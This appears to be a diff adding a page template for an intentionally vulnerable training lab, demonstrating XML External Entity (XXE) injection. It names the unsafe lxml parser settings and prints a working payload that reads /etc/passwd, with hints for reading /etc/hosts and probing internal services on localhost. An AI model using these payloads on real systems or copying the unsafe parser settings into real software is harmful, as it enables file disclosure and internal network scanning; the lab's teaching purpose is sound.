@@ -1,0 +1,30 @@
+{% extends "base.html" %}
+{% block title %}— XXE{% endblock %}
+{% block content %}
+<div class="card">
+  <div class="card-title">XML 파서 <span class="vuln-badge">XXE (XML External Entity)</span></div>
+  <div class="hint">
+    취약 코드: <code>etree.XMLParser(resolve_entities=True, load_dtd=True)</code><br><br>
+    테스트 페이로드 — /etc/passwd 읽기:<br>
+<pre style="font-size:11px;color:var(--accent2);margin:6px 0;">
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;
+</pre>
+    /etc/hosts 읽기: <code>file:///etc/hosts</code><br>
+    내부 서비스 스캔: <code>http://localhost:8080/</code>
+  </div>
+
+  <form method="POST">
+    <div class="form-group">
+      <label>XML 입력</label>
+      <textarea name="xml" rows="10">{{ xml_input }}</textarea>
+    </div>
+    <button type="submit" class="btn">파싱</button>
+  </form>
+
+  {% if result %}
+  <div class="output">{{ result }}</div>
+  {% endif %}
+</div>
+{% endblock %}
